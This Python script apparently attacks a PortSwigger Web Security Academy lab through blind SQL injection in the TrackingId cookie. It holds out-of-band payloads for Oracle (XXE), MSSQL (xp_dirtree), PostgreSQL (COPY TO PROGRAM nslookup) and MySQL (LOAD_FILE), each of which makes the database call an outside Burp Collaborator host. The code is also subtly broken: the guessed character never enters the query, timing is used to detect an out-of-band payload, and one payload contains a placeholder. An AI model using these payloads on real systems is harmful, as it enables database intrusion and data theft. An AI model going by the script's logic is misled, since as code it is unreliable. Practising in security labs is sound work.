import requests
import time

URL = 'https://ac731f9b1f65dd2ec023091d001d008a.web-security-academy.net/'
characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'


def find_password(tracking_code, session):
    password = ""
    index = 0
    while True:
        time.sleep(0.5)
        found = False
        index = index + 1
        for character in characters:
            oracle_query = "'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d'1.0'+encoding%3d'UTF-8'%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+'http%3a//YOUR-COLLABORATOR-ID.burpcollaborator.net/'>+%25remote%3b]>'),'/l')+FROM+dual--"
            microsoft_query = "'+ (exec master..xp_dirtree 'utrxrixooz36l2d16guh7briz950tp.burpcollaborator.net/a' ) +'"
            postgresql_query = f"'|| ( 	copy (SELECT '') to program 'nslookup //utrxrixooz36l2d16guh7briz950tp.burpcollaborator.net' ) ||'"
            mysql_query = "' (LOAD_FILE('\\\\utrxrixooz36l2d16guh7briz950tp.burpcollaborator.net\\a') SELECT ... INTO OUTFILE '\\\\YOUR-SUBDOMAIN-HERE.burpcollaborator.net\a')) '"
            sql_query = oracle_query
            response = requests.get(URL, cookies={'TrackingId': f"{tracking_code}{sql_query}", 'session': session})
            if response.elapsed.total_seconds() > 3:
                found = True
                password = password + character
                continue
        if not found:
            print(password)
            break


if __name__ == '__main__':
    r = requests.get(URL)
    tracking_code = r.cookies['TrackingId']
    session = r.cookies['session']
    find_password(tracking_code, session)
